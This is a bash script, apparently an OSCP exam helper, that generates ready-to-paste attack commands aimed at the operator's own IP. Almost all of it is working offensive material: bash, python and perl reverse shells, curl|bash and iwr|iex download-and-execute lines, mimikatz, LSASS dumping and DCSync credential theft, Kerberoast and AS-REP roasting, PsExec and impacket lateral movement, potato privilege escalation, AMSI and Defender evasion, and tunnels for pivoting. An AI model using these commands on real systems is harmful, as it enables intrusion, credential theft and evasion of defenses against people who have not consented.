#!/usr/bin/env bash
# payloads.sh - Generates copy-paste download/exec commands for target machines.
# Usage:
#   ./payloads.sh                # all common payloads (verbose)
#   ./payloads.sh --compact      # one-line-per-tool table (cheatsheet)
#   ./payloads.sh winpeas        # filter to a specific tool (verbose)
#   ./payloads.sh -p 80          # custom port
#   ./payloads.sh -i 10.10.14.5  # custom IP
set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

GREEN=$'\033[0;32m'; YELLOW=$'\033[1;33m'; CYAN=$'\033[0;36m'; BOLD=$'\033[1m'; DIM=$'\033[2m'; NC=$'\033[0m'

PORT="${ARSENAL_PORT:-8000}"
IP="${ARSENAL_IP:-}"
FILTER=""
COMPACT=0
SECTION="all"

while [ $# -gt 0 ]; do
    case "$1" in
        -p) PORT="$2"; shift 2 ;;
        -i) IP="$2"; shift 2 ;;
        -c|--compact) COMPACT=1; shift ;;
        -s|--section) COMPACT=1; SECTION="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 [-i <ip>] [-p <port>] [-c|--compact] [-s|--section <name>] [tool]"
            echo
            echo "Sections (use with -s): listener revshell linux windows tokens"
            echo "                        ad-recon kerberoast asreproast dcsync runas lateral"
            echo "                        powerupsql coercion dump transfer pivot fallback all"
            echo
            echo "Tool keywords (verbose mode): linpeas pspy winpeas powerup chisel ligolo nc"
            echo "                              revshell rubeus sharphound mimikatz kerbrute"
            exit 0 ;;
        *) FILTER="$1"; shift ;;
    esac
done

if [ -z "$IP" ]; then
    IP=$(ip -4 addr show tun0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP=$(ip -4 addr show eth0 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP=$(ifconfig 2>/dev/null | awk '/inet /{print $2}' | grep -v 127.0.0.1 | head -1)
    [ -z "$IP" ] && IP="<TUN0_IP>"
fi

URL="http://$IP:$PORT"
hr() { printf '%.0s-' {1..70}; echo; }
hdr() { echo -e "\n${BOLD}${CYAN}=== $* ===${NC}"; }
sub() { echo -e "${YELLOW}# $*${NC}"; }

# ============================================================
# COMPACT MODE - one line per tool, cheatsheet table
# ============================================================
if [ "$COMPACT" -eq 1 ]; then
    sec() { echo -e "\n${BOLD}${CYAN}--- $* ---${NC}"; }
    row() { printf "${GREEN}%-11s${NC} %s\n" "$1" "$2"; }
    # show <section_id> ... — runs the body only if the user asked for this section (or "all")
    show() {
        local id="$1"
        [ "$SECTION" = "all" ] || [ "$SECTION" = "$id" ]
    }

    if [ "$SECTION" = "all" ]; then
        echo -e "${BOLD}OSCP Arsenal${NC}  |  ${GREEN}$URL${NC}  |  LHOST=${GREEN}$IP${NC} LPORT=${GREEN}4444${NC}"
    fi

    # =========================================================
    # PHASE 1 - RECON & ENUMERATION
    # =========================================================
    if show listener; then
    sec "[1] LISTENER  (Kali side - waiting for incoming shell)"
    row "nc"         "rlwrap nc -lvnp 4444"
    row "pwncat"     "pwncat-cs -lp 4444   ${DIM}# auto TTY upgrade${NC}"
    row "msf"        "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; run'"
    fi

    if show revshell; then
    sec "[2] REVERSE SHELL  (run on target, LHOST=$IP LPORT=4444)"
    row "bash"       "bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'"
    row "python3"    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
    row "perl"       "perl -e 'use Socket;\$i=\"$IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    row "ps-tcp"     "iex (iwr $URL/revshells/Invoke-PowerShellTcp.ps1 -UB).Content; Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444"
    row "powercat"   "iex (iwr $URL/revshells/powercat.ps1 -UB).Content; powercat -c $IP -p 4444 -e cmd"
    row "php"        "${DIM}# upload to web target:${NC} $URL/revshells/php-reverse-shell.php"
    row "tty-fix"    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  ${DIM}# CTRL+Z; stty raw -echo; fg; export TERM=xterm-256color${NC}"
    fi

    if show linux; then
    sec "[3] LINUX ENUM & PRIVESC  (after catching shell)"
    row "linpeas"    "wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh"
    row "lse"        "wget $URL/linux/lse.sh -O /tmp/lse && chmod +x /tmp/lse && /tmp/lse -l2"
    row "les"        "wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les && bash /tmp/les"
    row "pspy"       "wget $URL/linux/pspy64 -O /tmp/p && chmod +x /tmp/p && /tmp/p   ${DIM}# cron/proc snoop${NC}"
    fi

    if show windows; then
    sec "[4a] WINDOWS ENUM & PRIVESC  (iwr -OutFile, when no AV)"
    row "winpeas"    "iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\\wp.exe; & \$env:TEMP\\wp.exe"
    row "privescchk" "iwr $URL/windows/PrivescCheck.ps1 -o \$env:TEMP\\pc.ps1; . \$env:TEMP\\pc.ps1; Invoke-PrivescCheck   ${DIM}# faster and stealthier than winPEAS${NC}"
    row "powerup"    "iwr $URL/windows/PowerUp.ps1 -o \$env:TEMP\\pu.ps1; . \$env:TEMP\\pu.ps1; Invoke-AllChecks"
    row "sherlock"   "iwr $URL/windows/Sherlock.ps1 -o \$env:TEMP\\sh.ps1; . \$env:TEMP\\sh.ps1; Find-AllVulns"
    row "jaws"       "iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\\j.ps1; powershell -ep bypass -f \$env:TEMP\\j.ps1"
    row "seatbelt"   "iwr $URL/windows/Seatbelt.exe -o \$env:TEMP\\sb.exe; & \$env:TEMP\\sb.exe -group=all"
    row "accesschk"  "iwr $URL/windows/accesschk64.exe -o \$env:TEMP\\ac.exe; & \$env:TEMP\\ac.exe -uwcqv 'Authenticated Users' *"
    fi

    if show tokens; then
    sec "[4b] TOKEN ABUSE  (when SeImpersonate/SeAssignPrimaryToken is set - gold in IIS/MSSQL/web shells)"
    row "juicypot"   "iwr $URL/windows/JuicyPotato.exe -o \$env:TEMP\\jp.exe; & \$env:TEMP\\jp.exe -t * -p cmd.exe -a '/c whoami' -l 9001   ${DIM}# Win < 1809 (older systems)${NC}"
    row "juicypotng" "iwr $URL/windows/JuicyPotatoNG.exe -o \$env:TEMP\\jpng.exe; & \$env:TEMP\\jpng.exe -t * -p cmd.exe -a '/c whoami'   ${DIM}# Win 1809+ (newer)${NC}"
    row "printspoof" "iwr $URL/windows/PrintSpoofer64.exe -o \$env:TEMP\\ps.exe; & \$env:TEMP\\ps.exe -i -c cmd   ${DIM}# Win10 1809+ / 2019 (most common)${NC}"
    row "godpotato"  "iwr $URL/windows/GodPotato-NET4.exe -o \$env:TEMP\\gp.exe; & \$env:TEMP\\gp.exe -cmd 'cmd /c whoami'   ${DIM}# if PrintSpoofer is patched, latest fallback${NC}"
    fi

    if show ad-recon; then
    sec "[5a] AD RECON  (domain enumeration)"
    row "powerview"  "iwr $URL/ad/PowerView.ps1 -o \$env:TEMP\\pv.ps1; . \$env:TEMP\\pv.ps1   ${DIM}# Get-NetUser, Get-NetGroup, Find-LocalAdminAccess${NC}"
    row "sharphound" "iex (iwr $URL/ad/SharpHound.ps1 -UB).Content; Invoke-BloodHound -CollectionMethod All"
    row "adpeas"     "iex (iwr $URL/enum/adPEAS.ps1 -UB).Content; Invoke-adPEAS"
    row "kerbrute"   "/tmp/kb userenum --dc <DC> -d <DOMAIN> users.txt   ${DIM}# wget $URL/ad/kerbrute_linux -O /tmp/kb${NC}"
    row "enum4lin"   "python3 $URL/enum/enum4linux-ng.py -A <target>   ${DIM}# run on Kali${NC}"
    row "lapstk"     "iex (iwr $URL/ad/LAPSToolkit.ps1 -UB).Content; Get-LAPSComputers; Get-LAPSPasswords   ${DIM}# if you can read LAPS, recovers local admin password${NC}"
    fi

    if show kerberoast; then
    sec "[5b] AD ATTACK - Kerberoast  (TGS hashes of SPN-enabled service accounts)"
    row "rubeus"     "iwr $URL/ad/Rubeus.exe -o \$env:TEMP\\r.exe; & \$env:TEMP\\r.exe kerberoast /outfile:hashes.txt /nowrap"
    row "impacket"   "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request -outputfile hashes.txt   ${DIM}# on Kali${NC}"
    row "crack"      "hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt"
    fi

    if show asreproast; then
    sec "[5c] AD ATTACK - AS-REPRoast  (users with DONT_REQ_PREAUTH flag)"
    row "rubeus"     "& \$env:TEMP\\r.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap"
    row "impacket"   "impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt   ${DIM}# Kali, unauthenticated${NC}"
    row "crack"      "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
    fi

    if show dcsync; then
    sec "[5d] AD ATTACK - DCSync  (with DA / Replication rights, dump all domain hashes)"
    row "mimikatz"   "lsadump::dcsync /domain:<DOMAIN> /user:Administrator   ${DIM}# inside mimikatz${NC}"
    row "mimi-all"   "lsadump::dcsync /domain:<DOMAIN> /all /csv"
    row "secretsdmp" "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# Kali, built-in DCSync${NC}"
    row "just-dc"    "impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>:<PASS>@<DC>   ${DIM}# NTDS only (stealthier)${NC}"
    fi

    if show runas; then
    sec "[5e] AD ATTACK - RunasCs  (use stolen creds to run commands as that user)"
    row "runas-exe"  "iwr $URL/windows/RunasCs.exe -o \$env:TEMP\\rc.exe; & \$env:TEMP\\rc.exe <USER> <PASS> 'cmd.exe /c whoami'"
    row "runas-rev"  "& \$env:TEMP\\rc.exe <USER> <PASS> -r $IP:4445   ${DIM}# direct revshell, open a listener${NC}"
    row "runas-net"  "& \$env:TEMP\\rc.exe <USER> <PASS> -l 8 'cmd /c dir \\\\<DC>\\C\$'   ${DIM}# logon type 8 = double-hop fix${NC}"
    row "runas-ps1"  "iex (iwr $URL/windows/Invoke-RunasCs.ps1 -UB).Content; Invoke-RunasCs <USER> <PASS> 'whoami'"
    fi

    if show lateral; then
    sec "[5f] LATERAL MOVEMENT - PsExec  (Windows→Windows, requires admin creds)"
    row "psexec-cmd" "iwr $URL/transfer/PsExec64.exe -o \$env:TEMP\\px.exe; & \$env:TEMP\\px.exe -accepteula \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> cmd.exe"
    row "psexec-sys" "& \$env:TEMP\\px.exe -accepteula -s \\\\<TARGET> cmd.exe   ${DIM}# -s = run as SYSTEM (when already admin)${NC}"
    row "psexec-py"  "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# from Kali, also accepts -hashes${NC}"
    row "wmiexec-py" "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# stealthier than psexec${NC}"
    row "smbexec-py" "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>   ${DIM}# psexec without dropping a file${NC}"
    row "evil-winrm" "evil-winrm -i <TARGET> -u <USER> -p <PASS>   ${DIM}# if WinRM (5985/5986) is open${NC}"
    fi

    if show powerupsql; then
    sec "[5g] AD ATTACK - PowerUpSQL  (MSSQL Server abuse, common on OSCP)"
    row "find-sql"   "iex (iwr $URL/windows/PowerUpSQL.ps1 -UB).Content; Get-SQLInstanceDomain | Get-SQLConnectionTest -Verbose"
    row "audit"      "Get-SQLInstanceDomain | Get-SQLServerInfo | ft -Auto   ${DIM}# version/edition/sysadmin?${NC}"
    row "xp-cmd"     "Get-SQLInstanceDomain | Invoke-SQLOSCmd -Command 'whoami' -Verbose   ${DIM}# RCE via xp_cmdshell${NC}"
    row "linked"     "Get-SQLServerLinkCrawl -Instance '<HOST>\\<INST>' -Query 'select system_user'   ${DIM}# linked server chain${NC}"
    row "imperson"   "Get-SQLInstanceDomain | Invoke-SQLImpersonateService -Verbose   ${DIM}# if IMPERSONATE is granted, become sa${NC}"
    row "audit-all"  "Get-SQLInstanceDomain | Invoke-SQLAudit -Verbose   ${DIM}# all checks, fastest path${NC}"
    fi

    if show coercion; then
    sec "[5h] AD ATTACK - Coercion + AD CS"
    row "petitpotam" "python3 /tmp/pp.py $IP <DC>   ${DIM}# coerce DC NTLM auth → Responder / ntlmrelayx${NC}"
    row "certify"    "iwr $URL/ad/Certify.exe -o \$env:TEMP\\c.exe; & \$env:TEMP\\c.exe find /vulnerable"
    row "ntlmrelay"  "impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"
    fi

    if show dump; then
    sec "[5i] CREDENTIAL DUMP"
    row "mimikatz"   "iwr $URL/ad/mimikatz_trunk.zip -o m.zip; Expand-Archive m.zip; .\\m\\x64\\mimikatz.exe   ${DIM}# privilege::debug; sekurlsa::logonpasswords${NC}"
    row "safetykatz" "iwr $URL/ad/SafetyKatz.exe -o \$env:TEMP\\sk.exe; & \$env:TEMP\\sk.exe   ${DIM}# Defender-evading mimikatz${NC}"
    row "lazagne-w"  "iwr $URL/ad/LaZagne.exe -o \$env:TEMP\\lz.exe; & \$env:TEMP\\lz.exe all   ${DIM}# browser/wifi/mail/RDP/DB creds${NC}"
    row "lazagne-l"  "wget $URL/linux/laZagne.py -O /tmp/lz.py && python3 /tmp/lz.py all"
    row "comsvcs"    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id \$env:TEMP\\l.dmp full   ${DIM}# LSASS dump (needs admin)${NC}"
    fi

    if show transfer; then
    sec "[6] FILE TRANSFER  (for small binaries)"
    row "nc-win"     "iwr $URL/transfer/nc.exe -o nc.exe; .\\nc.exe -e cmd.exe $IP 4444"
    row "plink"      "iwr $URL/transfer/plink.exe -o plink.exe; .\\plink.exe -ssh -l kali -pw <pw> -R 4444:127.0.0.1:4444 $IP"
    row "socat-lin"  "wget $URL/transfer/socat-linux-x64 -O /tmp/socat && chmod +x /tmp/socat"
    row "smb-share"  "${DIM}# Kali:${NC} impacket-smbserver share \$PWD -smb2support   ${DIM}# Target:${NC} copy \\\\$IP\\share\\file.exe"
    fi

    if show pivot; then
    sec "[7] PIVOT / TUNNEL  (continue into the internal network)"
    row "chisel-srv" "${DIM}# Kali:${NC} ./tools/transfer/chisel-linux server -p 4444 --reverse"
    row "chisel-lin" "wget $URL/transfer/chisel-linux -O /tmp/c && chmod +x /tmp/c && /tmp/c client $IP:4444 R:1080:socks"
    row "chisel-win" "iwr $URL/transfer/chisel-windows.exe -o c.exe; .\\c.exe client $IP:4444 R:1080:socks"
    row "ligolo-srv" "${DIM}# Kali:${NC} sudo ip tuntap add user \$USER mode tun ligolo && sudo ip link set ligolo up && ./tools/transfer/ligolo-proxy -selfcert"
    row "ligolo-lin" "wget $URL/transfer/ligolo-agent-linux -O /tmp/lagent && chmod +x /tmp/lagent && /tmp/lagent -connect $IP:11601 -ignore-cert"
    row "ligolo-win" "iwr $URL/transfer/ligolo-agent-windows.exe -o la.exe; .\\la.exe -connect $IP:11601 -ignore-cert"
    row "proxychns"  "${DIM}# add to /etc/proxychains4.conf:${NC} socks5 127.0.0.1 1080  ${DIM}# usage:${NC} proxychains nmap -sT <target>"
    fi

    if show fallback; then
    sec "[F] FALLBACK PATTERNS  (transformations when the command above gets blocked)"
    echo -e "${DIM}  iwr -o blocked    →  iex (iwr URL -UB).Content                  (in-memory, disk yok)${NC}"
    echo -e "${DIM}  PowerShell yok    →  certutil -urlcache -split -f URL out.exe   (cmd.exe ile)${NC}"
    echo -e "${DIM}  certutil yok      →  bitsadmin /transfer N URL out.exe          (eski Windows)${NC}"
    echo -e "${DIM}  AMSI takiliyor    →  ./amsi_b64.sh \"iex (iwr URL -UB).Content\"  (base64+bypass)${NC}"
    echo -e "${DIM}  ExecutionPolicy   →  powershell -ep bypass -f file.ps1${NC}"
    echo -e "${DIM}  ConstrainedLang   →  use .exe builds, drop .ps1 (Rubeus/Seatbelt/Sharphound)${NC}"
    fi

    if [ "$SECTION" = "all" ]; then
        echo
        echo -e "${YELLOW}Details:${NC}  ${GREEN}./payloads.sh <tool>${NC}    ${YELLOW}AMSI bypass:${NC}  ${GREEN}./amsi_b64.sh '<cmd>'${NC}    ${YELLOW}msfvenom:${NC}  ${GREEN}./msfgen.sh windows 4444${NC}"
    fi
    exit 0
fi
# ============================================================
# VERBOSE MODE (default) - sectioned with all alternatives
# ============================================================

section() {
    local key="$1" title="$2"; shift 2
    if [ -z "$FILTER" ] || echo "$key" | grep -qi "$FILTER"; then
        hdr "$title"
        echo "$@"
    fi
}

echo -e "${BOLD}OSCP Payload Helper${NC}  |  ${GREEN}$URL${NC}\n"

# ---------- LINUX ----------
section "linpeas" "LINUX - linPEAS (privesc)" "$(cat <<EOF
$(sub "wget")
wget $URL/linux/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh

$(sub "curl")
curl -sL $URL/linux/linpeas.sh | bash

$(sub "diskless (memory only)")
curl -sL $URL/linux/linpeas.sh | sh
EOF
)"

section "pspy" "LINUX - pspy64 (proc snooper)" "$(cat <<EOF
wget $URL/linux/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
EOF
)"

section "lse" "LINUX - lse.sh (smart enum)" "$(cat <<EOF
wget $URL/linux/lse.sh -O /tmp/lse.sh && chmod +x /tmp/lse.sh && /tmp/lse.sh -l1
EOF
)"

section "les" "LINUX - linux-exploit-suggester" "$(cat <<EOF
wget $URL/linux/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh
EOF
)"

section "socat" "LINUX - socat static binary" "$(cat <<EOF
wget $URL/transfer/socat-linux-x64 -O /tmp/socat && chmod +x /tmp/socat
# Reverse-shell relay:  /tmp/socat TCP-LISTEN:4444,reuseaddr,fork TCP:$IP:$PORT
EOF
)"

# ---------- WINDOWS ----------
section "winpeas" "WINDOWS - winPEAS" "$(cat <<EOF
$(sub "PowerShell IWR (.exe)")
iwr $URL/windows/winPEASx64.exe -o \$env:TEMP\winpeas.exe; & \$env:TEMP\winpeas.exe

$(sub "PowerShell .ps1 in-memory (no AMSI)")
iex (iwr $URL/windows/winPEAS.ps1 -UseBasicParsing).Content

$(sub "certutil")
certutil -urlcache -split -f $URL/windows/winPEASx64.exe winpeas.exe & winpeas.exe

$(sub "bitsadmin")
bitsadmin /transfer wp /priority high $URL/windows/winPEASx64.exe %TEMP%\wp.exe & %TEMP%\wp.exe

$(sub "batch version")
certutil -urlcache -split -f $URL/windows/winPEAS.bat wp.bat & wp.bat
EOF
)"

section "powerup" "WINDOWS - PowerUp.ps1" "$(cat <<EOF
iex (iwr $URL/windows/PowerUp.ps1 -UseBasicParsing).Content; Invoke-AllChecks
EOF
)"

section "sherlock" "WINDOWS - Sherlock.ps1" "$(cat <<EOF
iex (iwr $URL/windows/Sherlock.ps1 -UseBasicParsing).Content; Find-AllVulns
EOF
)"

section "jaws" "WINDOWS - JAWS" "$(cat <<EOF
iwr $URL/windows/jaws-enum.ps1 -o \$env:TEMP\j.ps1; powershell -ep bypass -f \$env:TEMP\j.ps1
EOF
)"

section "seatbelt" "WINDOWS - Seatbelt.exe" "$(cat <<EOF
iwr $URL/windows/Seatbelt.exe -o \$env:TEMP\sb.exe; & \$env:TEMP\sb.exe -group=all
EOF
)"

section "accesschk" "WINDOWS - AccessChk" "$(cat <<EOF
iwr $URL/windows/accesschk64.exe -o \$env:TEMP\ac.exe; & \$env:TEMP\ac.exe -uwcqv "Authenticated Users" *
EOF
)"

section "nc" "WINDOWS - netcat (nc.exe)" "$(cat <<EOF
$(sub "download")
certutil -urlcache -split -f $URL/transfer/nc.exe nc.exe
$(sub "reverse shell")
nc.exe -e cmd.exe $IP 4444
EOF
)"

section "plink" "WINDOWS - plink (SSH)" "$(cat <<EOF
certutil -urlcache -split -f $URL/transfer/plink.exe plink.exe
# Reverse SSH tunnel: plink.exe -ssh -l kali -pw <pw> -R 4444:127.0.0.1:4444 $IP
EOF
)"

# ---------- AD ----------
section "powerview" "AD - PowerView.ps1" "$(cat <<EOF
iex (iwr $URL/ad/PowerView.ps1 -UseBasicParsing).Content
# Then: Get-NetUser, Get-NetGroup, Get-NetComputer, Find-LocalAdminAccess
EOF
)"

section "rubeus" "AD - Rubeus.exe" "$(cat <<EOF
iwr $URL/ad/Rubeus.exe -o \$env:TEMP\r.exe
& \$env:TEMP\r.exe kerberoast /outfile:hashes.txt
& \$env:TEMP\r.exe asreproast /format:hashcat
EOF
)"

section "sharphound" "AD - SharpHound" "$(cat <<EOF
$(sub "ps1 (in-memory)")
iex (iwr $URL/ad/SharpHound.ps1 -UseBasicParsing).Content; Invoke-BloodHound -CollectionMethod All
$(sub "exe (download zip)")
iwr $URL/ad/SharpHound.zip -o sh.zip; Expand-Archive sh.zip; .\sh\SharpHound.exe -c All
EOF
)"

section "mimikatz" "AD - mimikatz" "$(cat <<EOF
iwr $URL/ad/mimikatz_trunk.zip -o \$env:TEMP\m.zip
Expand-Archive \$env:TEMP\m.zip -DestinationPath \$env:TEMP\m
& \$env:TEMP\m\x64\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
EOF
)"

section "kerbrute" "AD - kerbrute" "$(cat <<EOF
$(sub "linux")
wget $URL/ad/kerbrute_linux -O /tmp/kb && chmod +x /tmp/kb
/tmp/kb userenum --dc <DC_IP> -d <DOMAIN> users.txt
EOF
)"

# ---------- TUNNELING ----------
section "chisel" "TUNNEL - chisel (reverse SOCKS)" "$(cat <<EOF
$(sub "Kali (server)")
./tools/transfer/chisel-linux server -p 4444 --reverse

$(sub "Target Linux")
wget $URL/transfer/chisel-linux -O /tmp/c && chmod +x /tmp/c
/tmp/c client $IP:4444 R:1080:socks

$(sub "Target Windows")
iwr $URL/transfer/chisel-windows.exe -o \$env:TEMP\c.exe
& \$env:TEMP\c.exe client $IP:4444 R:1080:socks
EOF
)"

section "ligolo" "TUNNEL - ligolo-ng" "$(cat <<EOF
$(sub "Kali side")
sudo ip tuntap add user \$USER mode tun ligolo
sudo ip link set ligolo up
tar xzf tools/transfer/ligolo-proxy-linux.tar.gz -C /tmp/
/tmp/proxy -selfcert

$(sub "Target Linux agent")
wget $URL/transfer/ligolo-agent-linux.tar.gz -O /tmp/la.tgz
tar xzf /tmp/la.tgz -C /tmp/ && /tmp/agent -connect $IP:11601 -ignore-cert

$(sub "Target Windows agent")
iwr $URL/transfer/ligolo-agent-windows.zip -o \$env:TEMP\la.zip
Expand-Archive \$env:TEMP\la.zip -DestinationPath \$env:TEMP\la
& \$env:TEMP\la\agent.exe -connect $IP:11601 -ignore-cert
EOF
)"

# ---------- REV SHELLS ----------
section "revshell" "REV-SHELL - bash/python/php oneliners" "$(cat <<EOF
$(sub "bash")
bash -c 'bash -i >& /dev/tcp/$IP/4444 0>&1'

$(sub "python3")
python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'

$(sub "perl")
perl -e 'use Socket;\$i=\"$IP\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'

$(sub "powershell (Nishang Invoke-PowerShellTcp)")
iex (iwr $URL/revshells/Invoke-PowerShellTcp.ps1 -UseBasicParsing).Content
Invoke-PowerShellTcp -Reverse -IPAddress $IP -Port 4444

$(sub "powercat")
iex (iwr $URL/revshells/powercat.ps1 -UseBasicParsing).Content; powercat -c $IP -p 4444 -e cmd

$(sub "PHP webshell")
# Upload to target: $URL/revshells/php-reverse-shell.php
EOF
)"

# ---------- PTY UPGRADE ----------
section "pty" "TTY UPGRADE (after catching shell)" "$(cat <<EOF
$(sub "Full interactive TTY")
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z, then on Kali:
stty raw -echo; fg
# Then on target:
export TERM=xterm-256color; stty rows 50 cols 200
EOF
)"

# ---------- LISTENERS ----------
section "listener" "LISTENERS (Kali side)" "$(cat <<EOF
$(sub "nc")
nc -lvnp 4444

$(sub "rlwrap (history+arrows)")
rlwrap nc -lvnp 4444

$(sub "pwncat-cs (auto upgrade)")
pwncat-cs -lp 4444
EOF
)"

if [ -z "$FILTER" ]; then
    echo
    hr
    echo -e "${YELLOW}Tip:${NC} single tool        ${GREEN}./payloads.sh winpeas${NC}"
    echo -e "${YELLOW}Tip:${NC} AMSI bypass + b64  ${GREEN}./amsi_b64.sh '<command>'${NC}"
    echo -e "${YELLOW}Tip:${NC} msfvenom payload   ${GREEN}./msfgen.sh windows 4444${NC}"
fi
